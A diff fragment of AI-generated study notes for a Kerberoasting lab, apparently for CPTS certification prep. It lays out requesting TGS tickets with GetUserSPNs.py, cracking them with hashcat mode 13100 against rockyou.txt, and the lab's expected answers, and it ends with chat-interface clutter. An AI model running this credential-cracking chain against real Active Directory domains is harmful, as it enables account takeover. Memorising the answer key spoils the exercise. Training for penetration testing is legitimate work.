+║  $krb5tgs$23$* → use mode 13100                                      ║
+║  $krb5tgs$17$* → use mode 19600                                      ║
+║  $krb5tgs$18$* → use mode 19700                                      ║
+║                                                                      ║
+╠══════════════════════════════════════════════════════════════════════╣
+║                                                                      ║
+║  EXPECTED ANSWERS FOR THIS LAB:                                      ║
+║  Q1 Password  → Crack SAPService TGS with rockyou.txt               ║
+║  Q2 Group     → Account Operators                                    ║
+║                                                                      ║
+╚══════════════════════════════════════════════════════════════════════╝
+```
+
+---
+
+## 🧠 CONCEPTUAL SUMMARY — What You Learned Today
+
+```
+┌─────────────────────────────────────────────────────────────────────┐
+│                    KERBEROASTING ATTACK CHAIN                       │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                     │
+│  [You]──SSH──▶[Linux Attack Host]                                   │
+│                      │                                              │
+│                       │  GetUserSPNs.py (valid domain creds)        │
+│                       ▼                                             │
+│              [Domain Controller]                                    │
+│              172.16.5.5                                             │
+│                       │                                             │
+│                       │  Returns TGS ticket encrypted               │
+│                       │  with SAPService's NTLM hash                │
+│                       ▼                                             │
+│              [SAPService_tgs.txt]                                   │
+│              $krb5tgs$23$*SAPService$...                            │
+│                       │                                             │
+│                       │  Hashcat -m 13100 + rockyou.txt             │
+│                       ▼                                             │
+│              [CRACKED PASSWORD] ✅                                   │
+│                                                                     │
+├─────────────────────────────────────────────────────────────────────┤
+│  WHY IT WORKS:                                                      │
+│  Any domain user can request TGS tickets → By design               │
+│  TGS is encrypted with service account's password hash             │
+│  Weak passwords = crackable offline = no lockout risk              │
+├─────────────────────────────────────────────────────────────────────┤
+│  WHY SAPSERVICE IS DANGEROUS:                                       │
+│  Member of "Account Operators" built-in group                      │
+│  Can create/modify domain user accounts                            │
+│  Can log on locally to Domain Controllers                          │
+│  Effectively near-Domain-Admin level of damage potential           │
+└─────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+> **📌 Final Note for CPTS Preparation:**  
+> Kerberoasting is one of the **most frequently tested** techniques in the CPTS exam. Make sure you understand not just _how_ to run the commands, but _why_ the attack works — specifically that:
+> 
+> -   TGS ticket\=Encrypt(session key, NTLM hash of service account)
+> -   Cracking the ticket = recovering the NTLM hash's source password
+> -   The attack requires **zero special privileges** — any domain user can do it
+> -   Defense = long, complex, randomly generated service account passwords (30+ characters)
+
+$0.12,866 tok43.8s
+
+8
+
+Responses are AI-generated and can be inaccurate. Review all outputs before relying on them.
+
+Select a modelSelect a model
+
+## Embedded Content]
 
 ```text
 ══════════════════════════════════════════════════════════════════
